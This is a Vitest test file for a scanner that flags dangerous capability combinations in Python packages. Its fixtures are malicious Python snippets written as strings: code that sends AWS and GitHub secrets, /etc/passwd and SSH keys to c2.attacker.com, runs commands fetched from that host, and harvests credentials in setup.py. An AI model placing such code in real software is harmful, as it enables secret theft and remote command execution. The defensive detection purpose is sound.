import { describe, expect, it, beforeAll } from 'vitest';
import { AstCapabilityAnalyzer } from '../src/capabilities/ast-capability-analyzer.js';
import { CapabilityMatrix } from '../src/capabilities/capability-matrix.js';
import { TreeSitterLoader } from '../src/parsers/tree-sitter-loader.js';

describe('Phase 3 — Python Capability Combination Alerts (SC-CAP-100 to SC-CAP-106)', () => {
  beforeAll(async () => {
    await TreeSitterLoader.init();
  });

  it('1. SC-CAP-100 fires for Python code with os.environ + requests.post (env+network)', async () => {
    const code = `
import os
import requests

def harvest_and_exfiltrate():
    token = os.environ.get("AWS_SECRET_ACCESS_KEY")
    requests.post("https://c2.attacker.com/collect", json={"token": token})
`;
    const analysis = await AstCapabilityAnalyzer.analyzeFile(code, 'src/exfil_env.py');
    expect(analysis.capabilities.hasEnvAccess).toBe(true);
    expect(analysis.capabilities.hasNetwork).toBe(true);

    const hits = CapabilityMatrix.evaluateCombinations(analysis.capabilities, analysis.sites, {
      packageName: 'stealth-env-harvester',
    });

    // Anti-fake test: Assert specific ruleId present and list not empty
    expect(hits.length).toBeGreaterThan(0);
    const sc100 = hits.find((h) => h.ruleId === 'SC-CAP-100');
    expect(sc100).toBeDefined();
    expect(sc100?.severity).toBe('HIGH');
    expect(sc100?.threatType).toBe('CAPABILITY_VIOLATION');
    expect(sc100?.participatingCapabilities).toContain('network');
    expect(sc100?.participatingCapabilities).toContain('env');
    expect(sc100?.evidenceSites.some((s) => s.capability === 'env')).toBe(true);
    expect(sc100?.evidenceSites.some((s) => s.capability === 'network')).toBe(true);
  });

  it('2. SC-CAP-100 does NOT fire for shell-only Python code', async () => {
    const code = `
import subprocess

def run_isolated():
    subprocess.run(["ls", "-la"])
`;
    const analysis = await AstCapabilityAnalyzer.analyzeFile(code, 'src/shell_only.py');
    expect(analysis.capabilities.hasShell).toBe(true);
    expect(analysis.capabilities.hasNetwork).toBe(false);
    expect(analysis.capabilities.hasEnvAccess).toBe(false);

    const hits = CapabilityMatrix.evaluateCombinations(analysis.capabilities, analysis.sites, {
      packageName: 'benign-shell-tool',
    });

    // SC-CAP-100 (network+env) and SC-CAP-102 (shell+network) must NOT fire
    expect(hits.some((h) => h.ruleId === 'SC-CAP-100')).toBe(false);
    expect(hits.some((h) => h.ruleId === 'SC-CAP-102')).toBe(false);
    expect(hits.some((h) => h.ruleId === 'SC-CAP-101')).toBe(false);
  });

  it('3. SC-CAP-102 fires for Python code with subprocess.run + requests.get (shell+network)', async () => {
    const code = `
import subprocess
import requests

def remote_shell_handler():
    cmd = requests.get("https://c2.attacker.com/next-task").text
    subprocess.run(cmd, shell=True)
`;
    const analysis = await AstCapabilityAnalyzer.analyzeFile(code, 'src/reverse_shell.py');
    expect(analysis.capabilities.hasShell).toBe(true);
    expect(analysis.capabilities.hasNetwork).toBe(true);

    const hits = CapabilityMatrix.evaluateCombinations(analysis.capabilities, analysis.sites, {
      packageName: 'py-reverse-shell',
    });

    expect(hits.length).toBeGreaterThan(0);
    const sc102 = hits.find((h) => h.ruleId === 'SC-CAP-102');
    expect(sc102).toBeDefined();
    expect(sc102?.severity).toBe('HIGH');
    expect(sc102?.threatType).toBe('CAPABILITY_VIOLATION');
    expect(sc102?.participatingCapabilities).toContain('shell');
    expect(sc102?.participatingCapabilities).toContain('network');
    expect(sc102?.evidenceSites.some((s) => s.capability === 'shell')).toBe(true);
    expect(sc102?.evidenceSites.some((s) => s.capability === 'network')).toBe(true);
  });

  it('4. SC-CAP-101 fires for Python code with requests.post + sensitive file reading (network+sensitive fs)', async () => {
    const code = `
import requests

def exfil_shadow():
    with open("/etc/passwd", "r") as f:
        data = f.read()
    requests.post("https://c2.attacker.com/leak", data=data)
`;
    const analysis = await AstCapabilityAnalyzer.analyzeFile(code, 'src/leak_creds.py');
    expect(analysis.capabilities.hasNetwork).toBe(true);
    expect(analysis.capabilities.hasFsSensitive).toBe(true);

    const hits = CapabilityMatrix.evaluateCombinations(analysis.capabilities, analysis.sites, {
      packageName: 'py-cred-harvester',
    });

    expect(hits.length).toBeGreaterThan(0);
    const sc101 = hits.find((h) => h.ruleId === 'SC-CAP-101');
    expect(sc101).toBeDefined();
    expect(sc101?.severity).toBe('CRITICAL');
    expect(sc101?.blocking).toBe(true);
    expect(sc101?.participatingCapabilities).toContain('network');
    expect(sc101?.participatingCapabilities).toContain('fsSensitive');
  });

  it('5. SC-CAP-103 fires for Python code with subprocess.run + eval() (shell+eval dropper)', async () => {
    const code = `
import subprocess

def dropper(payload_str):
    code_obj = eval(payload_str)
    subprocess.run(["python", "-c", str(code_obj)])
`;
    const analysis = await AstCapabilityAnalyzer.analyzeFile(code, 'src/eval_dropper.py');
    expect(analysis.capabilities.hasShell).toBe(true);
    expect(analysis.capabilities.hasEval).toBe(true);

    const hits = CapabilityMatrix.evaluateCombinations(analysis.capabilities, analysis.sites, {
      packageName: 'py-eval-dropper',
    });

    expect(hits.length).toBeGreaterThan(0);
    const sc103 = hits.find((h) => h.ruleId === 'SC-CAP-103');
    expect(sc103).toBeDefined();
    expect(sc103?.severity).toBe('HIGH');
    expect(sc103?.participatingCapabilities).toContain('shell');
    expect(sc103?.participatingCapabilities).toContain('eval');
  });

  it('6. SC-CAP-106 fires for Python package with install script (setup.py) accessing sensitive filesystem', async () => {
    const code = `
from setuptools import setup
import os

# Malicious post-install probing sensitive file in setup.py
creds = open(os.path.expanduser("~") + "/.ssh/id_rsa", "r").read()

setup(
    name="malicious-installer",
    version="0.1.0",
)
`;
    const analysis = await AstCapabilityAnalyzer.analyzeFile(code, 'setup.py');
    expect(analysis.capabilities.hasFsSensitive).toBe(true);

    const hits = CapabilityMatrix.evaluateCombinations(analysis.capabilities, analysis.sites, {
      packageName: 'malicious-installer',
      hasInstallScript: true,
      installScriptEvidence: [
        {
          capability: 'shell',
          file: 'setup.py',
          startLine: 1,
          startCol: 0,
          endLine: 1,
          endCol: 10,
          snippet: 'setup.py lifecycle hook',
          resolved: true,
          confidence: 'HIGH',
          details: 'Python package install lifecycle script (setup.py)',
        },
      ],
    });

    const sc106 = hits.find((h) => h.ruleId === 'SC-CAP-106');
    expect(sc106).toBeDefined();
    expect(sc106?.severity).toBe('CRITICAL');
    expect(sc106?.blocking).toBe(true);
    expect(sc106?.reachabilityGated).toBe(false);
  });

  it('7. SC-CAP-105 fires for Python install script with environment variable harvesting', async () => {
    const code = `
from setuptools import setup
import os

env_token = os.environ.get("GITHUB_TOKEN")

setup(
    name="env-harvester",
    version="0.1.0",
)
`;
    const analysis = await AstCapabilityAnalyzer.analyzeFile(code, 'setup.py');
    expect(analysis.capabilities.hasEnvAccess).toBe(true);

    const hits = CapabilityMatrix.evaluateCombinations(analysis.capabilities, analysis.sites, {
      packageName: 'env-harvester',
      hasInstallScript: true,
      installScriptEvidence: [
        {
          capability: 'shell',
          file: 'setup.py',
          startLine: 1,
          startCol: 0,
          endLine: 1,
          endCol: 10,
          snippet: 'setup.py lifecycle hook',
          resolved: true,
          confidence: 'HIGH',
          details: 'setup.py hook',
        },
      ],
    });

    const sc105 = hits.find((h) => h.ruleId === 'SC-CAP-105');
    expect(sc105).toBeDefined();
    expect(sc105?.severity).toBe('HIGH');
    expect(sc105?.reachabilityGated).toBe(false);
  });

  it('8. Triple combo: Python code with subprocess + requests + os.environ triggers multiple combination alerts', async () => {
    const code = `
import subprocess
import requests
import os

def triple_threat():
    token = os.environ.get("SECRET_KEY")
    resp = requests.post("https://c2.attacker.com/task", json={"token": token})
    subprocess.run(resp.text, shell=True)
`;
    const analysis = await AstCapabilityAnalyzer.analyzeFile(code, 'src/triple_threat.py');
    expect(analysis.capabilities.hasShell).toBe(true);
    expect(analysis.capabilities.hasNetwork).toBe(true);
    expect(analysis.capabilities.hasEnvAccess).toBe(true);

    const hits = CapabilityMatrix.evaluateCombinations(analysis.capabilities, analysis.sites, {
      packageName: 'triple-threat-pkg',
    });

    // SC-CAP-100 (Env + Network) and SC-CAP-102 (Shell + Network) must BOTH fire
    const sc100 = hits.find((h) => h.ruleId === 'SC-CAP-100');
    const sc102 = hits.find((h) => h.ruleId === 'SC-CAP-102');
    expect(sc100).toBeDefined();
    expect(sc102).toBeDefined();
    expect(hits.length).toBeGreaterThanOrEqual(2);
  });

  it('9. Anti-fake-test: ensures evaluateCombinations evaluates actual capabilities and does not return empty for combos', async () => {
    const code = `
import os
import requests
requests.get("https://example.com", headers={"X-Key": os.environ["API_KEY"]})
`;
    const analysis = await AstCapabilityAnalyzer.analyzeFile(code, 'src/anti_fake.py');
    const hits = CapabilityMatrix.evaluateCombinations(analysis.capabilities, analysis.sites, {
      packageName: 'anti-fake-check',
    });

    // Fails if CapabilityMatrix.evaluateCombinations() returns []
    expect(hits).not.toEqual([]);
    expect(hits.length).toBeGreaterThan(0);
    expect(hits.some((h) => h.ruleId === 'SC-CAP-100')).toBe(true);
  });
});
